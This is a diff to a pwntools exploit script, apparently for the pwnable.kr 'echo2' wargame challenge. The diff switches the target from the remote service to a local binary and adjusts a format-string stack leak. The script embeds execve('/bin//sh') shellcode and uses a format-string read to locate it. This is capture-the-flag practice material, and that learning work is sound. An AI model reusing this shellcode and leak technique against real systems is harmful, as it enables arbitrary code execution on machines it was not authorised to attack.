@@ -14,7 +14,7 @@ Exploit plan
 6. Select menu-2 or 3 to run shellcode.
 """
 
-context.log_level = "warning"
+context.log_level = "debug"
 
 
 def select_menu(num):
@@ -22,9 +22,9 @@ def select_menu(num):
     p.sendline(num.encode())
 
 
-#p = process("/root/Downloads/echo2")
 #
-p = remote("pwnable.kr", 9011)
+p = process("/root/Downloads/echo2")
+#p = remote("pwnable.kr", 9011)
 # 23Bytes shellcode. last "\x90" is for padding.
 shell_code = b"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
 print(p.recvuntil(b": ").decode())
@@ -32,7 +32,7 @@ p.sendline(shell_code)
 
 select_menu("2")
 print(p.recvline())
-p.sendline(b"%2$lx")
+p.sendline(b"%4$lx")
 rsp_add = int(p.recvline().strip().decode(), 16)
 print(hex(rsp_add))
 
